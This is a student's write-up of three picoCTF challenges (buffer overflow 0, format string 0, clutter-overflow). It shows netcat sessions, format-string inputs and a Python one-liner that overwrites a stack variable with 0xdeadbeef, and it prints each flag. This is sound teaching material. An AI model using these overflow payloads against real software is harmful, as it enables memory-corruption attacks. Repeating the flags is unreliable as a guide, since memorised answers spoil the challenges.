# 1. buffer overflow 0
This challenge involves exploiting a buffer overflow vulnerability in a given program. We are also given access to the source code, which helps in understanding how the buffer is handled and where the vulnerability lies.

## Solution:
1. First I received the two files: `vuln` and `vuln.c`. I opened vuln.c with vim to understand how the program works. Reading the source code - I noticed that it asks for a flag.txt file. Nothing was understandable from that.
    <img width="1920" height="983" alt="image (2)" src="https://github.com/user-attachments/assets/e87a9a3b-ae6c-44ac-b753-64b3338990f5" />

2. So I tried running the `vuln` program directly. So I changed its permissions to make it executable.
3. It prompted for input, but I was not sure what to input yet.
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/bufferoverflow0]
    └─$ chmod +x vuln

    ┌──(neels㉿neel)-[~/PicoCTF/bufferoverflow0]
    └─$ ./vuln
    Please create 'flag.txt' in this directory with your own debugging flag.
    ```
4. Next, I connected to the challenge server via netcat using `nc saturn.picoctf.net 54577`. The server takes input so I gave - "Input: 93874" and then printed "The program will exit now."
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/bufferoverflow0]
    └─$ nc saturn.picoctf.net 54577
    Input: 93874
    ```
5. I was not able to figure out. I tried reading the code again.
6. I reviewed the source code again, focusing on functions like `strcpy` and `gets` - which are known to be unsafe as they dont perform bounds checking(I got to know in PPS class). I saw that `strcpy(buf2, input)` was used, and `buf2` had a fixed size of 16 bytes.
7. So I prepared an input string longer than 16 characters to overflow `buf2`.
8. I made the previous command run again and wrote any random string greater than 16. This caused the program to respond with the flag:
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/bufferoverflow0]
    └─$ nc saturn.picoctf.net 54577
    Input: 039485704398732094873409873294870987534987
    picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
    ```

## Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Concepts learnt:
- Understanding how buffer overflows work and how unsafe functions like `strcpy` and `gets` can be exploited.

## Notes:
- I was initially trying to create a random flag file, but since the title was overflow i resisted it and started thinking the other way.
- I also thought about using `gdb` to analyze the binary and after doing a little came back.

## Resources:
- Only Google to get some search about strcpy.
<<<<<<< HEAD
- Later when I opened hint the `man gets` and under that BUGS section was stated.








# 2. format string 0
This challenge involves exploiting format string vulnerabilities in a binary program. The program prompts the user to recommend burgers from a list, but the input is processed using a printf like function.

## Solution:
1. I started by downloading the source code and binary to analyze the programs behavior. I tried to understand the code but not in very detail as last question instead of going and running through the binary second file I connected to the challenge server using `nc mimas.picoctf.net 55252`.
2. Then the game started where something options was given out of 3, I first tried and guessed wrong.
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/formatstring0]
    └─$ nc mimas.picoctf.net 55252
    Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
    Here comes the first customer Patrick who wants a giant bite.
    Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
    Enter your recommendation: Breakf@st_Burger
    Breakf@st_BurgerPatrick is still hungry!
    Try to serve him something of larger size!
    ```
3. I played it again, But this time something odd was there in options. Since string was to be there as in challenge title, so it remembered me of `%s` in C programming.Thus I selected the option - `Gr%114d_Cheese`
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/formatstring0]
    └─$ nc mimas.picoctf.net 55252
    Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
    Here comes the first customer Patrick who wants a giant bite.
    Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
    Enter your recommendation: Gr%114d_Cheese
    Gr                                                                                                           4202954_Cheese
    Good job! Patrick is happy! Now can you serve the second customer?
    Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
    Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
    Enter your recommendation:
    ```
4. Now for next option - option 1 and 3 both have `%s`, so I tried out 3rd as it has more number of %s(which was illogical...) but I got my flag.
    ```bash
    Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
    Enter your recommendation: Cla%sic_Che%s%steak
    ClaCla%sic_Che%s%steakic_Che(null)
    picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
    ```

## Flag:
```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
```

## Concepts learnt:
- Understanding how format string vulnerabilities work in C programming.
- Learning that format specifiers like `%s`, `%d`, and `%114d` can be used to read or manipulate memory.

## Notes:
After many google searches and refernces I tried to found out the reason and found that - 
```C
if (count > 2 * BUFSIZE) {
    serve_bob();
}
```
This code is checking greater than 64 bytes as BUFSIZE is 32 bytes. So our `Gr%114d_Cheese` is greater than 64 as the `%114d` is a format specifier in "Gr%114d_Cheese". When printf encounters %114d, it expects to print a number with a width of 114 characters.
And for second part I dont get any best answer but I think - `%t` is valid but here in `%s` there were lot more character after that like - `%steak` is not valid as %s still tries to process it.

## Resources:
- [Format String Exploits in C](https://owasp.org/www-community/attacks/Format_string_attack)






# 3. clutter-overflow
This challenge involves exploiting a buffer overflow vulnerability in a C program. The program reads input into a buffer with a fixed size using `gets()`, which is unsafe because it does not check the length of the input.

## Solution:
1. First, I opened the `chall.c` file using `vim` to understand how the code works. Next I ran the challenge binary to see what it displayed. It checked the response with the code and it should be equal to - 0xdeadbeef.
    ```
    My room is so cluttered...
    What do you see?
    ldkfdslksdnvsdlkndsdoksdc
    code == 0x0
    code != 0xdeadbeef :(
    ```
2. I saw that the buffer clutter was defined with size `0x100`, So I used python to get the number in int.
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/clutter-overflow]
    └─$ python3
    Python 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.

    > >>>int(0x100)
    256
    >
    ```
3. So it was 256 bytes. After watching a video I got to know that functions such as gets which was by the way in code are vulnerable to overflow as in first challenge.
4. So in the code `gets(clutter);` and before it
    ```
    long code = 0;
    char clutter[SIZE];
    ```
    are there, now I got to know that if we overflow the gets function using input it can buffer overflow and put value in the code.
5. We have to give command and using linux luminarium in Tp1 we got to know about piping which we can output it to chall. Now to insert some character we can use python and after some searches I got to know that we can use `python -c` command to give one line command output.
6. Thus I tried to buffer with exact 256 which I know is the limit and it printed -
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/clutter-overflow]
    └─$ python3 -c "print('K'*256)" | ./chall
    My room is so cluttered...
    What do you see?
    code == 0x0
    code != 0xdeadbeef :(
    ```
7. Then I checked with one above which I expected to buffer overflow but nothing happened.
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/clutter-overflow]
    └─$ python3 -c "print('K'*260)" | ./chall
    ```
8. After one more try I tried with 260 but that also did not worked. Then I directly wrote 280 and something overflow took place.
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/clutter-overflow]
    └─$ python3 -c "print('K'*280)" | ./chall

    My room is so cluttered...
    What do you see?
    code == 0x4b4b4b4b4b4b4b4b
    code != 0xdeadbeef :(
    zsh: done                python3 -c "print('K'*280)" |
    zsh: segmentation fault  ./chall
    ```
9. Now since instead of this random thing we want to overflow with - `0xdeadbeef `
To do so, I got to know about little endian which I was already somehow awared from previous challenges, So to use that for - `0xdeadbeef` = `ef be ad de` (as 1 bytes represent 2 hex character ) = `\xef\xbe\xad\xde`
10. But I started using 256.
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/clutter-overflow]
    └─$ python3 -c "print('K'*256 + '\xef\xbe\xad\xde')" | ./chall
    ```
    But this didnt work and I got to know that this was not the first point where it was overflowed. Then after many hit and trials I got my first overflow point which was 265. Thus we will start with 264.
11. So I wrote - 
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/clutter-overflow]
    └─$ (python3 -c "print('A'*264+'\xef\xbe\xad\xde')") | ./chall

    My room is so cluttered...
    What do you see?
    code == 0x9ec3adc2bec2afc3
    code != 0xdeadbeef :(
    ```
    Which did not gave answer, but after many trials I got to know that in this method it gives directly in UTF encoding but to give it exactly - `sys.stdout.buffer.write()` which writes exact bytes, no newline with no encoding.
12. Thus I wrote and it worked.
    ```bash
    ┌──(neels㉿neel)-[~/PicoCTF/clutter-overflow]
    └─$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*264 + b'\xef\xbe\xad\xde')" | ./chall

    My room is so cluttered...
    What do you see?
    code == 0xdeadbeef: how did that happen??
    take a flag for your troubles
    cat: flag.txt: No such file or directory
    ```
13. Now I changed it with server to get flag.
    ```bash
    ──(neels㉿neel)-[~/PicoCTF/clutter-overflow]
    └─$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*264 + b'\xef\xbe\xad\xde\n')" | nc [mars.picoctf.net](http://mars.picoctf.net/) 31890

    My room is so cluttered...
    What do you see?
    code == 0xdeadbeef: how did that happen??
    take a flag for your troubles
    picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
    ```

## Flag:
```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:
- I learned that buffer overflows occur when input exceeds the allocated buffer size, overwriting adjacent memory.
- The `gets()` function is unsafe because it does not limit input length. 
- Understanding how data is stored in memory in little-endian format. 
- Working with raw bytes in Python using `sys.stdout.buffer.write()`.

## Notes:
Initially, I tried sending 256 `'K'` characters but saw no effect, so I increased the input size.
This gave me error because it was sending in UTF encoding.
```bash
┌──(neels㉿neel)-[~/PicoCTF/clutter-overflow]
└─$ (python3 -c "print('K'*264)+'\xef\xbe\xad\xde'") | ./chall
```
## Resources:
- [Buffer Overflow Tutorial](https://www.youtube.com/watch?v=qSnPayW6F7U&t=214s)
